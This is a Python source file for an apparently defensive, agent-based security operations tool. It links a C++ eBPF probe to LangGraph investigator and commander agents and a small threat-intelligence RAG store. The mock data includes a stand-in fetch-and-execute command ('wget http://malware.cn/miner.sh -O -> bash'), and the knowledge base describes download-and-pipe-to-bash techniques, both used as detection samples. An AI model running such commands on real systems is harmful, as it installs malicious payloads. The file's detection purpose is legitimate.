import subprocess
import json
import time
import os
from dotenv import load_dotenv

from langchain_core.tools import tool
from langchain_openai import ChatOpenAI
from langchain_core.messages import HumanMessage
from langgraph.graph import StateGraph, START, END
from langgraph.prebuilt import create_react_agent
from typing import TypedDict

# 加载环境变量
load_dotenv()

MODEL_NAME = os.environ.get("MODEL_NAME", "deepseek-chat")

class CppProbeWrapper:
    def __init__(self, mock=False):
        self.mock = mock
        self.process = None
        self.request_id = 1
        self.pending_requests = {}
        self.alert_callback = None
        
        # 自动检测是否存在真实的 C++ 二进制文件
        if not self.mock and os.path.exists("./build/aegis_agent"):
            print("[Python Agent] 正在启动底层 C++ 探针...")
            env = os.environ.copy()
            env["LD_LIBRARY_PATH"] = "/home/zyq/aegis-agent/third_party/onnxruntime/lib"
            self.process = subprocess.Popen(
                ["./build/aegis_agent"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                env=env
            )
            
            import threading
            self.lock = threading.Lock()
            self.cond = threading.Condition(self.lock)
            self.reader_thread = threading.Thread(target=self._message_pump, daemon=True)
            self.reader_thread.start()
            
            def stderr_reader():
                while True:
                    line = self.process.stderr.readline()
                    if not line: break
                    print(line, end="")
            threading.Thread(target=stderr_reader, daemon=True).start()
            
            # 等待底层服务器启动并挂载 tools
            import requests
            for _ in range(10):
                try:
                    res = requests.post("http://127.0.0.1:8080/message", json={"jsonrpc": "2.0", "id": 1, "method": "tools/list"}, timeout=1)
                    if res.status_code == 200:
                        break
                except Exception:
                    time.sleep(1)
            print("[Python Agent] 成功连接底层内核态 C++ 探针。")
        else:
            self.mock = True
            print("[Python Agent] 运行在 Mock 模式 (未检测到 ./build/aegis_agent 或强制 Mock)。")

    def _message_pump(self):
        while True:
            line = self.process.stdout.readline()
            if not line:
                break
            try:
                msg = json.loads(line.strip())
                
                # 处理异步通知 (Event Trigger)
                if "method" in msg and msg["method"] == "notifications/threat_detected":
                    if self.alert_callback:
                        params = msg.get("params", {})
                        ip = params.get("src_ip", "Unknown")
                        port = params.get("dst_port", 0)
                        score = params.get("confidence", 0.0)
                        self.alert_callback(ip, port, score)
            except json.JSONDecodeError:
                # 不是 JSON，说明是 C++ 探针直接打印的日志信息，直接打印给用户看
                print(line, end="")

    def _call_rpc_sync(self, method, params=None):
        if self.mock: return {}
        
        with self.lock:
            req_id = self.request_id
            self.request_id += 1
            
        req = {
            "jsonrpc": "2.0",
            "id": req_id,
            "method": method
        }
        if params: req["params"] = params
        
        try:
            import requests
            response = requests.post("http://127.0.0.1:8080/message", json=req, timeout=30.0)
            if response.status_code == 200:
                return response.json()
            else:
                return {"error": f"HTTP {response.status_code}"}
        except Exception as e:
            return {"error": str(e)}

    def listen_for_alerts(self, callback):
        self.alert_callback = callback
        if self.mock:
            print("[Python Agent] Mock 模式：3秒后模拟一次告警...")
            time.sleep(3)
            callback("1.2.3.4", 443, 0.99)

    def call_tool(self, name, arguments):
        if self.mock:
            print(f"  [💻 Mock eBPF 探针] 调用 {name}({arguments})")
            if name == "get_pid_by_connection":
                return {"result": {"pid": 8901}}
            elif name == "analyze_process_behavior":
                return {"result": {"cmdline": "wget http://malware.cn/miner.sh -O -> bash", "cwd": "/tmp"}}
            elif name == "block_malicious_ip":
                return {"result": {"status": "success", "action": "eBPF 硬件拦截生效"}}
            return {"result": {}}

        print(f"  [💻 C++ eBPF 探针] 穿透调用内核工具: {name}...")
        msg = self._call_rpc_sync("tools/call", {
            "name": name,
            "arguments": arguments
        })
        if msg and "result" in msg:
            return msg
        elif msg and "error" in msg:
            print(f"  [❌ C++ eBPF 探针] 工具调用失败: {msg['error']}")
            return msg
        return {"result": "No response"}
        
    def terminate(self):
        if self.process:
            self.process.terminate()

# 初始化全局探针（自动适配真实/Mock环境）
# 如果已经编译了C++探针，将 mock 设为 False 以启动真实探针
probe = CppProbeWrapper(mock=False) 

@tool
def get_pid_by_connection(ip: str, port: int) -> dict:
    """通过网络连接 (IP 和 端口) 获取发起该连接的进程 PID。"""
    res = probe.call_tool("get_pid_by_connection", {"ip": ip, "port": port})
    return res.get("result", {})

@tool
def analyze_process_behavior(pid: int) -> dict:
    """分析指定 PID 进程的运行时行为（如 cmdline, cwd 等）。"""
    res = probe.call_tool("analyze_process_behavior", {"pid": pid})
    return res.get("result", {})

@tool
def block_malicious_ip(ip: str) -> dict:
    """通过 eBPF 拦截指定的恶意 IP 地址，从网卡层面进行物理斩杀。"""
    res = probe.call_tool("block_malicious_ip", {"ip": ip})
    return res.get("result", {})

# --------------------------
# LangGraph Multi-Agent 状态与节点定义
# --------------------------
class AgentState(TypedDict):
    threat_ip: str
    threat_port: int
    investigation_report: str
    decision: str

def investigator_node(state: AgentState):
    """取证专员 (Investigator) 节点逻辑"""
    print(f"\n[🕵️ 取证专员 (Agent 1)] 接到告警，开始调查网络实体 {state['threat_ip']}:{state['threat_port']}...")
    
    prompt = (
        f"你是一个高级安全取证专员。系统发现了高危异常连接：源 IP: {state['threat_ip']}, 目标端口: {state['threat_port']}。\n"
        "你需要严格执行以下操作：\n"
        "1. 使用 get_pid_by_connection 工具获取背后的进程 PID。\n"
        "2. 如果获取到了 PID，立即使用 analyze_process_behavior 工具分析该进程的命令行和上下文。\n"
        "3. 综合上述信息，撰写一份简洁有力的取证报告返回给我。"
    )
    
    # 压制 warning
    import warnings
    warnings.filterwarnings("ignore", category=DeprecationWarning)
    
    api_key = os.environ.get("OPENAI_API_KEY") or os.environ.get("ARK_API_KEY")
    investigator_agent = create_react_agent(
        ChatOpenAI(model=MODEL_NAME, api_key=api_key, base_url=os.environ.get("OPENAI_BASE_URL")), 
        tools=[get_pid_by_connection, analyze_process_behavior]
    )
    result = investigator_agent.invoke({"messages": [HumanMessage(content=prompt)]})
    
    report = result["messages"][-1].content
    print(f"[🕵️ 取证专员] 取证完毕，输出报告:\n{report}")
    return {"investigation_report": report}

from langchain_community.vectorstores import FAISS
from langchain_core.embeddings import Embeddings
from langchain_core.documents import Document
import requests

class VolcengineMultimodalEmbeddings(Embeddings):
    def __init__(self, model: str, api_key: str, base_url: str):
        self.model = model
        self.api_key = api_key
        # Ensure base_url doesn't end with / if we append /embeddings/multimodal
        self.endpoint = base_url.rstrip('/') + "/embeddings/multimodal"
        
    def _embed(self, texts: list[str]) -> list[list[float]]:
        headers = {
            "Content-Type": "application/json",
            "Authorization": f"Bearer {self.api_key}"
        }
        
        # Format the input exactly as the Volcengine multimodal API expects for text
        # The API expects `input` to be a list of mixed content blocks, OR for batching
        # Actually, looking at the curl, "input" is a list of objects.
        # Wait, if we want to batch multiple texts, we might have to send multiple requests
        # or structure them differently. Let's send them one by one for safety, or 
        # assume "input" can just be one text object per request to get its embedding.
        
        embeddings = []
        for text in texts:
            payload = {
                "model": self.model,
                "input": [
                    {
                        "type": "text",
                        "text": text
                    }
                ]
            }
            response = requests.post(self.endpoint, headers=headers, json=payload)
            response.raise_for_status()
            data = response.json()
            
            try:
                # 尝试标准 OpenAI 格式
                if isinstance(data.get("data"), list):
                    embeddings.append(data["data"][0]["embedding"])
                elif "embedding" in data.get("data", {}):
                    # 某些不规范的 API 可能会把 data 当作对象
                    embeddings.append(data["data"]["embedding"])
                elif "embeddings" in data:
                    embeddings.append(data["embeddings"][0])
                else:
                    raise KeyError("找不到 embedding 字段")
            except Exception as e:
                print(f"\n[❌ API 返回格式解析失败] 请将以下完整的 API 返回发给我：\n{json.dumps(data, indent=2, ensure_ascii=False)}")
                raise ValueError("API 返回结构不匹配")
            
        return embeddings

    def embed_documents(self, texts: list[str]) -> list[list[float]]:
        return self._embed(texts)

    def embed_query(self, text: str) -> list[float]:
        return self._embed([text])[0]

# --------------------------
# 初始化真实 RAG 知识库
# --------------------------
def setup_rag():
    print("[Python Agent] 正在初始化本地威胁情报向量数据库 (FAISS RAG)...")
    knowledge_base = [
        "MITRE T1059.004: 攻击者经常使用 /bin/bash 执行恶意的 shell 脚本。",
        "MITRE T1105: 攻击者经常使用 wget 或 curl 从外部服务器下载恶意载荷 (如 miner.sh, rsa_key) 并使用管道 -> bash 立即执行。",
        "MITRE T1562: 攻击者在下载恶意程序后，通常会使用 chmod +x 赋予其执行权限。",
        "网络层 IOC: 任何向 443 端口发起的高频未知连接，如果伴随 wget 下载行为，99.9% 属于 C2 信标心跳或无文件挖矿后门。"
    ]
    docs = [Document(page_content=text) for text in knowledge_base]
    
    # 使用自定义的火山引擎多模态向量模型客户端
    embedding_model = os.environ.get("EMBEDDING_MODEL_NAME", "doubao-embedding-vision-251215")
    api_key = os.environ.get("OPENAI_API_KEY") or os.environ.get("ARK_API_KEY")
    embeddings = VolcengineMultimodalEmbeddings(
        model=embedding_model,
        api_key=api_key,
        base_url=os.environ.get("OPENAI_BASE_URL")
    )
    
    try:
        vector_store = FAISS.from_documents(docs, embeddings)
        return vector_store.as_retriever(search_kwargs={"k": 2})
    except Exception as e:
        import traceback
        print(f"\n[❌ RAG 初始化失败] 无法加载火山引擎向量化模型 '{embedding_model}'。")
        print(f"  详细错误: {e}")
        print(traceback.format_exc())
        print("  💡 提示: 火山引擎通常需要使用『推理接入点 (Endpoint ID)』作为模型名称（格式如 ep-202xxxxxxxx-xxxx）。")
        print("  请确保您的 .env 文件中配置了正确的 EMBEDDING_MODEL_NAME。")
        import sys
        sys.exit(1)

rag_retriever = setup_rag()

def commander_node(state: AgentState):
    """安全指挥官 (Commander) 节点逻辑"""
    print("\n[👑 安全指挥官 (Agent 2)] 正在接收取证报告，并在本地知识库 (RAG) 中检索相似特征...")
    
    report = state['investigation_report']
    retrieved_docs = rag_retriever.invoke(report)
    rag_context = "\n".join([f"- {doc.page_content}" for doc in retrieved_docs])
    print(f"  [🔍 RAG 检索] 找到相关本地威胁情报:\n{rag_context}")
    
    prompt = (
        f"你是一个具备最高权限的 SOC 安全指挥官。请仔细阅读以下取证报告：\n"
        f"-----------------\n"
        f"{report}\n"
        f"-----------------\n"
        f"以下是从本地向量知识库 (RAG) 检索到的相关情报：\n"
        f"{rag_context}\n"
        f"-----------------\n"
        f"请结合 RAG 知识库情报对上述报告进行研判。如果符合恶意特征并认定为高危安全事件，请必须调用 block_malicious_ip 工具阻断源 IP ({state['threat_ip']})！并输出你的最终处置战报。"
    )
    
    api_key = os.environ.get("OPENAI_API_KEY") or os.environ.get("ARK_API_KEY")
    commander_agent = create_react_agent(
        ChatOpenAI(model=MODEL_NAME, api_key=api_key, base_url=os.environ.get("OPENAI_BASE_URL")), 
        tools=[block_malicious_ip]
    )
    result = commander_agent.invoke({"messages": [HumanMessage(content=prompt)]})
    
    decision = result["messages"][-1].content
    print(f"\n[👑 安全指挥官] 最终处置决议:\n{decision}")
    return {"decision": decision}

def run_soc_workflow():
    # 构建 LangGraph 状态图
    workflow = StateGraph(AgentState)
    
    workflow.add_node("investigator", investigator_node)
    workflow.add_node("commander", commander_node)
    
    workflow.set_entry_point("investigator")
    workflow.add_edge("investigator", "commander")
    workflow.add_edge("commander", END)
    
    app = workflow.compile()
    
    print("======================================================")
    print(" 🚀 Aegis v4.0 - True Async Data Plane & Multi-Agent SOC")
    print("======================================================")
    
    print("\n[🛡️ 系统就绪] 正在持续监听来自 C++ eBPF 探针的实时威胁告警...")
    
    # 阻塞事件
    import threading
    done_event = threading.Event()

    def on_threat_detected(ip, port, score):
        print(f"\n[🚨 快系统预警] 边缘 AI 模型在极速流量中命中高危特征！(评分 {score})\n    目标: 源 IP {ip}, 端口: {port}")
        
        initial_state = {
            "threat_ip": ip,
            "threat_port": port,
            "investigation_report": "",
            "decision": ""
        }
        
        app.invoke(initial_state)
        print("\n[✅ 结案] 慢系统 (Agent SOC) 与快系统 (eBPF) 自动闭环响应完成。")
        done_event.set()

    probe.listen_for_alerts(on_threat_detected)
    
    # [开发演示辅助] 主动向网卡发送含恶意特征的流量，触发 C++ PcapSniffer
    if not probe.mock:
        def send_trigger_traffic():
            time.sleep(2)
            print("[Python Agent 辅助] 正在向本机网卡发送模拟攻击载荷 (wget miner.sh) 以触发数据面探针...")
            try:
                # 使用 curl 发送一个包含特征字符串的 HTTP 请求
                subprocess.run(
                    ["curl", "-s", "http://example.com", "-d", "wget miner.sh"], 
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
            except Exception:
                pass
        threading.Thread(target=send_trigger_traffic, daemon=True).start()

    try:
        done_event.wait(timeout=300.0) # wait up to 5 mins
    except KeyboardInterrupt:
        print("\n[Python Agent] 正在退出...")
    finally:
        probe.terminate()

if __name__ == "__main__":
    run_soc_workflow()
